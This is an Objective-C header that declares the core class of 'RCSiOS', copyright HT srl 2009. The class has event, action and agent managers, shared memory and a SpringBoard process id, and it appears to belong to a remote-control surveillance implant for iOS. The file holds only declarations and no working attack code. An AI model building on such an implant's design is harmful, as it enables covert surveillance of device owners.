/*
 * RCSiOS - Core Header
 *  pon pon
 *
 *
 * Created on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSICore_h__
#define __RCSICore_h__

#import "RCSIUtils.h"
#import "RCSISharedMemory.h"
#import "RCSIEventManager.h"
#import "RCSIActionManager.h"
#import "RCSIAgentManager.h"

extern void checkAndRunDemoMode();

#define CORE_STOPPED  1
#define CORE_STOPPING 2
#define CORE_RUNNING  4

@interface RCSICore : NSObject
{
@private
  uint mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
  uint32_t          moduleStatus;
  RCSIUtils         *mUtil;
  RCSIEventManager  *eventManager;
  RCSIActionManager *actionManager;
  RCSIAgentManager  *agentManager;
  int               mLockSock;
  pid_t             mSBPid;
}

@property (readwrite)       uint mMainLoopControlFlag;
@property (readonly)        RCSIUtils *mUtil;
@property (readwrite)       pid_t mSBPid;

- (id)initWithShMemorySize:(int)aSize;

- (void)dealloc;

- (BOOL)runMeh;

@end

#endif
